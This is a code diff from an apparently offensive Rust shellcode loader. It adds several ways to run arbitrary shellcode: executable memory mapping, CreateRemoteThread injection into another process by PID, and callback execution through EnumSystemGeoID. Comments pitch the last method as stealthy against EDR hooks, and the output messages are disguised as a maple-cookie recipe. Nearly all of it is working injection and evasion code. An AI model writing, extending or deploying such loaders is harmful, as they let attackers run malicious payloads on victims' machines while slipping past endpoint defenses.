@@ -7,6 +7,10 @@ use std::mem;
 
 extern crate kernel32;
 use std::ptr;
+
+#[cfg(windows)]
+use winapi::um::winnls::{EnumSystemGeoID, GEO_ENUMPROC};
+#[cfg(windows)]
 use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
 
 use bstr::ByteSlice;
@@ -132,6 +136,13 @@ impl ShellCode {
     }
 
     pub fn load(self) {
+        /*
+        load shellcode into memory by leveraging the mmap create, which will then call mmap on POSIX, and VirtualAlloc/CreateFileMapping on Windows
+
+        https://docs.rs/mmap/0.1.1/mmap/struct.MemoryMap.html
+        https://kerkour.com/rust-execute-from-memory
+        */
+
         let map =
             mmap_fixed::MemoryMap::new(self.sc.len(), &[MapReadable, MapWritable, MapExecutable])
                 .unwrap();
@@ -142,14 +153,22 @@ impl ShellCode {
                 "[+] fixer les protections de la mémoire à {:p}",
                 self.sc.as_ptr()
             );
-            println!("{:?}", self.sc.as_ptr());
+
             let exec_shellcode: extern "C" fn() -> ! = mem::transmute(map.data());
             println!("[+] commencer la recette des biscuits à l'érable");
             exec_shellcode();
         }
     }
 
-    pub fn load_createremotethread(self, pid: u32) {
+    #[cfg(windows)]
+    pub fn load_CreateRemoteThread(self, pid: u32) {
+        /*
+        you already know what this is
+
+        https://github.com/trickster0/OffensiveRust/blob/master/Process_Injection_CreateRemoteThread/src/main.rs
+        https://tbhaxor.com/createremotethread-process-injection/
+        */
+
         unsafe {
             let mut h = kernel32::OpenProcess(
                 PROCESS_ALL_ACCESS,
@@ -183,6 +202,41 @@ impl ShellCode {
             );
             println!("[+] commencer la recette des biscuits à l'érable");
             kernel32::CloseHandle(h);
+        }
+    }
+
+    #[cfg(windows)]
+    pub fn load_EnumSystemGeoID(self) {
+        /*
+        this runs in the current process just like load(). but this uses a wack ass API Call that might not be hooked by EDR.
+        that makes this a bit more stealthy, however it still uses VirtualAlloc so you may need to unhook it
+
+        https://github.com/trickster0/OffensiveRust/blob/master/Process_Injection_Self_EnumSystemGeoID/src/main.rs
+        https://www.cybermongol.ca/operator-research/callback-shellcode-injection
+        */
+
+        unsafe {
+            let curr_proc = kernel32::GetCurrentProcessId();
+
+            println!("[+] current pid: {}", curr_proc.to_string());
+
+            let base_addr = kernel32::VirtualAlloc(
+                ptr::null_mut(),
+                self.sc.len().try_into().unwrap(),
+                MEM_COMMIT,
+                PAGE_EXECUTE_READWRITE,
+            );
+
+            std::ptr::copy(self.sc.as_ptr() as _, base_addr, self.sc.len());
+
+            println!("[+] commencer la recette des biscuits à l'érable");
+
+            // Callback execution
+            let res = EnumSystemGeoID(
+                16,
+                0,
+                mem::transmute::<*mut std::ffi::c_void, GEO_ENUMPROC>(base_addr),
+            );
         }
     }
 }
